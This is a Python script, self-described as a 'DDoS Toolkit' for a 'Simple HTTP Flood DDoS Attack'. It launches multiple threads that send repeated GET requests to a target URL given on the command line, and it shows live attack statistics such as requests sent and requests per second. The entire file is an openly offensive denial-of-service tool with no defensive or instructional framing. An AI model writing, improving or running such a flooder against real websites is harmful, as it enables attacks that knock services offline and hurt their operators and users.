#!/usr/bin/env python3
import requests
import time
import sys
import argparse
import threading
import logging
from colorama import init, Fore, Style
from datetime import datetime

# Initialize colorama
init(autoreset=True)

# Colors for different messages
RED = Fore.RED
GREEN = Fore.GREEN
YELLOW = Fore.YELLOW
BLUE = Fore.BLUE
RESET = Style.RESET_ALL

# Global variables to count requests and success/error statistics
requests_sent = 0
successful_requests = 0
failed_requests = 0
rps = 0  # Requests per second
last_time = time.time()

requests_lock = threading.Lock()  # Lock for thread-safe requests counting

# Function to display the banner with colors
def display_banner():
    print(f"""
    {BLUE}##################################################
    {BLUE}#                                                #
    {BLUE}#                DDoS Toolkit                    #
    {BLUE}#        Simple HTTP Flood DDoS Attack           #
    {BLUE}#                                                #
    {YELLOW}#            Created BY MIDO                   #
    {YELLOW}#                                              #
    {BLUE}#                                                #
    {BLUE}##################################################
    """)

# Function to send requests to the target URL
def attack(target_url, stop_event, pause_time):
    global requests_sent, successful_requests, failed_requests
    while not stop_event.is_set():
        try:
            start_time = time.time()
            response = requests.get(target_url, timeout=3)

            # Calculate response time
            response_time = time.time() - start_time

            # Adaptive throttling based on server response time and failure rate
            if response_time > 1.0:  # Adjust pause time if response time is too high
                pause_time *= 1.1
            elif response.status_code == 404 or response.status_code == 403:
                failed_requests += 1
                pause_time *= 1.2

            if response.status_code >= 500:
                failed_requests += 1
                print(f"{RED}Server error: {response.status_code}. Target may be down or overloaded.")
                stop_event.set()
                break
            elif response.status_code == 404:
                failed_requests += 1
                print(f"{RED}404: Not Found. The server may be unreachable.")
                stop_event.set()
                break
            elif response.status_code == 403:
                failed_requests += 1
                print(f"{RED}403: Forbidden. The server has blocked the attack.")
                stop_event.set()
                break

            with requests_lock:
                requests_sent += 1
                successful_requests += 1

        except requests.RequestException as e:
            failed_requests += 1
            print(f"{RED}Error: Unable to reach the server. Details: {e}")
            stop_event.set()
            print(f"{YELLOW}The server appears to be down or unreachable!")
            break

        time.sleep(pause_time)  # Pause to control request rate

# Function to display the status of the attack with a color-coded table
def display_status(stop_event):
    global requests_sent, successful_requests, failed_requests, rps, last_time
    while not stop_event.is_set():
        with requests_lock:
            elapsed_time = time.time() - last_time
            if elapsed_time > 1:
                rps = requests_sent / elapsed_time
                last_time = time.time()
            success_rate = (successful_requests / requests_sent * 100) if requests_sent > 0 else 0
            error_rate = (failed_requests / requests_sent * 100) if requests_sent > 0 else 0

            # Clear the screen and print the table (it will refresh every second)
            print(f"\033c", end="")  # ANSI escape sequence to clear the screen
            print(f"{BLUE}Attack Progress:")
            print(f"{GREEN}-----------------------------------------------")
            print(f"{YELLOW}| {GREEN}Metric{YELLOW} | {GREEN}Value{RESET}     |")
            print(f"{YELLOW}|------------------------------------|------------|")
            print(f"{GREEN}| Requests Sent:             | {requests_sent:<18} |")
            print(f"{GREEN}| Successful Requests: | {successful_requests:<18} |")
            print(f"{RED}| Failed Requests:           | {failed_requests:<18} |")
            print(f"{YELLOW}| RPS:                             | {rps:<18.2f} |")
            print(f"{YELLOW}| Success Rate:      | {success_rate:.2f}%        |")
            print(f"{RED}| Error Rate:             | {error_rate:.2f}%        |")
            print(f"{GREEN}-----------------------------------------------")

        time.sleep(1)

# Function to parse command-line arguments
def parse_args():
    parser = argparse.ArgumentParser(description="Simple DDoS attack script")
    parser.add_argument("-u", "--url", type=str, required=True, help="Target URL for the attack (e.g., http://example.com)")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads to use (default: 10)")
    parser.add_argument("-p", "--pause", type=float, default=0.1, help="Pause time between requests (in seconds, default: 0.1)")
    parser.add_argument("-l", "--logfile", type=str, default="attack_log.txt", help="Log file to write logs (default: 'attack_log.txt')")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable detailed logging")
    args = parser.parse_args()
    return args.url, args.threads, args.pause, args.logfile, args.verbose

# Function to set up logging configuration
def setup_logging(logfile, verbose):
    log_level = logging.DEBUG if verbose else logging.INFO
    logging.basicConfig(
        level=log_level,
        format="%(asctime)s - %(levelname)s - %(message)s",
        handlers=[
            logging.FileHandler(logfile),
            logging.StreamHandler(sys.stdout)  # Print logs to console as well
        ]
    )
    logger = logging.getLogger()
    return logger

# Main function to run the DDoS attack
def main():
    global requests_sent, successful_requests, failed_requests, rps

    # Parse arguments
    target_url, num_threads, pause_time, logfile, verbose = parse_args()

    if not target_url.startswith(('http://', 'https://')):
        print(f"{RED}Error: Invalid URL. URL must start with 'http://' or 'https://'.")
        sys.exit(1)

    # Set up logging
    logger = setup_logging(logfile, verbose)

    # Display the banner
    display_banner()

    # Create a stop event to stop all threads gracefully
    stop_event = threading.Event()

    # Start the display status thread
    status_thread = threading.Thread(target=display_status, args=(stop_event,))
    status_thread.daemon = True
    status_thread.start()

    # Start attack threads
    attack_threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=attack, args=(target_url, stop_event, pause_time))
        t.daemon = True
        attack_threads.append(t)
        t.start()

    # Wait for the user to stop the attack
    try:
        while True:
            time.sleep(pause_time)
    except KeyboardInterrupt:
        print(f"\n{RED}Attack interrupted by user.")
        stop_event.set()

    # Wait for all attack threads to finish
    for t in attack_threads:
        t.join()

    # Print final results
    print(f"{GREEN}Attack finished. Total requests sent: {requests_sent}")
    
if __name__ == "__main__":
    main()
